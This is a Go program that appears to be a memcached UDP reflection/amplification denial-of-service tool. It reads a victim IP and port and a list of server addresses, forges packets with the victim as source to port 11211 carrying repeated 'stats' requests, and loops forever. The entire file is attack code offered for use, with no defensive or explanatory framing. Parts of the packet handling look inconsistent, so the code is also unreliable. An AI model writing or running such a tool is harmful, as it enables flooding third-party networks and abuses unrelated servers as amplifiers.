package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const payload = "stats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\nstats\r\n"

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	fmt.Print("IP: ")
	scanner.Scan()
	target := scanner.Text()

	fmt.Print("Port: ")
	scanner.Scan()
	portStr := scanner.Text()
	port, err := strconv.Atoi(portStr)
	if err != nil {
		panic(err)
	}

	fmt.Print("IPs file: ")
	scanner.Scan()
	filepath := scanner.Text()
	file, err := os.Open(filepath)
	if err != nil {
		panic(err)
	}
	b, err := io.ReadAll(file)
	if err != nil {
		panic(err)
	}

	for {
		for _, ip := range strings.Split(string(b), "\n") {
			if ip == "" {
				continue
			}

			Do(ip, target, port)

			time.Sleep(time.Millisecond)
		}
	}
}

func Do(serverIP, targetIP string, targetPort int) {
	conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
	if err != nil {
		panic(err)
	}

	defer conn.Close()

	src := net.ParseIP(targetIP)

	ip := &layers.IPv4{
		SrcIP:    src,
		DstIP:    net.ParseIP(serverIP),
		Protocol: layers.IPProtocolUDP,
	}

	udp := &layers.UDP{
		SrcPort: layers.UDPPort(targetPort),
		DstPort: layers.UDPPort(11211),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	udp.SetNetworkLayerForChecksum(ip)
	if err := gopacket.SerializeLayers(buf, opts, ip, udp, gopacket.Payload([]byte(payload))); err != nil {
		panic(err)
	}

	srcAddr := &net.IPAddr{
		IP: net.IP(src),
	}

	fmt.Println(string(buf.Bytes()))
	fmt.Println()

	if _, err := conn.WriteTo(buf.Bytes(), srcAddr); err != nil {
		panic(err)
	}
}
